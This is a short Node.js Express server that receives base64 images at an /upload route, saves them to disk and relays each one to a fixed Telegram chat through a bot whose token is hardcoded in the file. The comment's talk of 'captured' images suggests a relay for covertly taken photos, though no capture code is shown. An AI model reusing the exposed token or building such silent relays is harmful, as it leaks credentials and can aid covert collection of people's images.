const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const app = express();
const port = 3000;

// Create a Telegram bot instance
const bot = new TelegramBot('6319088580:AAEbnbIQkzhnRNlBpmKsbgZHGbY_4G5Tt48', { polling: false });

// Set up body-parser middleware
app.use(bodyParser.json());

// Route to receive image data from client
app.post('/upload', (req, res) => {
    const imageData = req.body.image;
    
    // Save the image to a file
    const fileName = `image_${Date.now()}.jpg`;
    fs.writeFileSync(fileName, imageData, 'base64');

    // Send the image to the Telegram bot
    sendImageToTelegramBot(fileName);

    res.json({ message: 'Image received and sent to Telegram bot' });
});

// Function to send the captured image data to the Telegram bot
function sendImageToTelegramBot(fileName) {
    // Replace YOUR_CHAT_ID with your chat ID or a group chat ID
    const chatId = '1784265871';
    
    // Send photo message to Telegram bot
    bot.sendPhoto(chatId, `${__dirname}/${fileName}`)
        .then(() => {
            console.log('Image sent to Telegram bot successfully');
        })
        .catch((error) => {
            console.error('Error sending image to Telegram bot:', error);
        });
}

// Start the server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
